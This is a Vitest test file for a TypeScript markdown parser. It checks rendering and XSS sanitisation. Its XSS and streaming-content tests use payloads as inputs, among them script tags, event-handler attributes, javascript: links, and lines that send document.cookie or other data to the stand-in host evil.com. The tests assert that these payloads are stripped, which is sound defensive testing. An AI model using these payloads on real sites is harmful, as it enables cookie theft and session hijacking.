import { describe, it, expect } from 'vitest';
import { parseMarkdown } from './markdown';

describe('parseMarkdown', () => {
	// ── Empty/null input ──

	it('returns empty string for empty input', () => {
		expect(parseMarkdown('')).toBe('');
	});

	it('returns empty string for null/undefined', () => {
		expect(parseMarkdown(null as any)).toBe('');
		expect(parseMarkdown(undefined as any)).toBe('');
	});

	it('returns empty string for falsy values', () => {
		expect(parseMarkdown(0 as any)).toBe('');
		expect(parseMarkdown(false as any)).toBe('');
	});

	// ── Markdown rendering ──

	it('renders bold text', () => {
		const result = parseMarkdown('**bold**');
		expect(result).toContain('<strong>bold</strong>');
	});

	it('renders italic text', () => {
		const result = parseMarkdown('*italic*');
		expect(result).toContain('<em>italic</em>');
	});

	it('renders headings', () => {
		const result = parseMarkdown('# Heading 1');
		expect(result).toContain('<h1>');
		expect(result).toContain('Heading 1');
	});

	it('renders unordered lists', () => {
		const result = parseMarkdown('- item 1\n- item 2');
		expect(result).toContain('<ul>');
		expect(result).toContain('<li>');
		expect(result).toContain('item 1');
	});

	it('renders ordered lists', () => {
		const result = parseMarkdown('1. first\n2. second');
		expect(result).toContain('<ol>');
		expect(result).toContain('first');
	});

	it('renders line breaks (breaks: true)', () => {
		const result = parseMarkdown('line 1\nline 2');
		expect(result).toContain('<br>');
	});

	it('renders GFM tables', () => {
		const result = parseMarkdown('| A | B |\n|---|---|\n| 1 | 2 |');
		expect(result).toContain('<table>');
		expect(result).toContain('<td>');
	});

	it('renders inline code', () => {
		const result = parseMarkdown('use `foo()` here');
		expect(result).toContain('<code>foo()</code>');
	});

	it('renders links', () => {
		const result = parseMarkdown('[link](https://example.com)');
		expect(result).toContain('href="https://example.com"');
		expect(result).toContain('link');
	});

	// ── XSS prevention ──

	it('strips script tags', () => {
		const result = parseMarkdown('<script>alert("xss")</script>');
		expect(result).not.toContain('<script');
		expect(result).not.toContain('alert');
	});

	it('strips onerror attributes', () => {
		const result = parseMarkdown('<img src=x onerror=alert(1)>');
		expect(result).not.toContain('onerror');
	});

	it('strips javascript: URLs in links', () => {
		const result = parseMarkdown('[click](javascript:alert(1))');
		expect(result).not.toContain('javascript:');
	});

	it('strips event handler attributes', () => {
		const result = parseMarkdown('<div onclick="alert(1)">click</div>');
		expect(result).not.toContain('onclick');
	});

	it('strips iframe tags', () => {
		const result = parseMarkdown('<iframe src="https://evil.com"></iframe>');
		expect(result).not.toContain('<iframe');
	});

	it('strips SVG with script payload', () => {
		const result = parseMarkdown('<svg onload="alert(1)">');
		expect(result).not.toContain('onload');
	});

	// ── Parser failure fallback ──

	it('handles plain text without markdown gracefully', () => {
		const result = parseMarkdown('Just regular text here.');
		expect(result).toContain('Just regular text here.');
	});

	it('handles text with special characters', () => {
		const result = parseMarkdown('Price: $100 & <tax>');
		expect(result).toContain('Price');
		// Special chars should be handled (either escaped or preserved safely)
		expect(result).not.toContain('<tax>'); // angle brackets sanitized
	});

	// ── Streaming content scenarios ──
	// These simulate content that could arrive via SSE stream from a
	// compromised or malicious backend.

	it('strips script injected mid-stream in markdown content', () => {
		const streamedContent = '## Analysis Results\n\nThe case involves <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script> multiple parties.';
		const result = parseMarkdown(streamedContent);
		expect(result).toContain('Analysis Results');
		expect(result).toContain('multiple parties');
		expect(result).not.toContain('<script');
		expect(result).not.toContain('evil.com');
		expect(result).not.toContain('document.cookie');
	});

	it('strips data exfiltration via img tag in streamed content', () => {
		const streamedContent = 'Summary: <img src="https://evil.com/log?data=secret" onerror="alert(1)">';
		const result = parseMarkdown(streamedContent);
		expect(result).not.toContain('onerror');
		expect(result).not.toContain('alert');
	});

	it('strips javascript: in markdown links from stream', () => {
		const streamedContent = 'Click [here](javascript:void(document.location="https://evil.com/"+document.cookie)) for details.';
		const result = parseMarkdown(streamedContent);
		expect(result).not.toContain('javascript:');
		expect(result).not.toContain('document.cookie');
	});

	it('handles incomplete/malformed HTML tags from partial stream', () => {
		// Simulates content cut mid-tag (stream chunk boundary)
		const result = parseMarkdown('Analysis in progress<scri');
		expect(result).toContain('Analysis in progress');
		// Should not contain any raw angle brackets that could start a tag
		expect(result).not.toContain('<scri');
	});

	it('handles embedded style tag with data exfiltration', () => {
		const streamedContent = '<style>body { background: url("https://evil.com/track"); }</style>Normal content.';
		const result = parseMarkdown(streamedContent);
		expect(result).toContain('Normal content');
		expect(result).not.toContain('<style');
		expect(result).not.toContain('evil.com');
	});
});
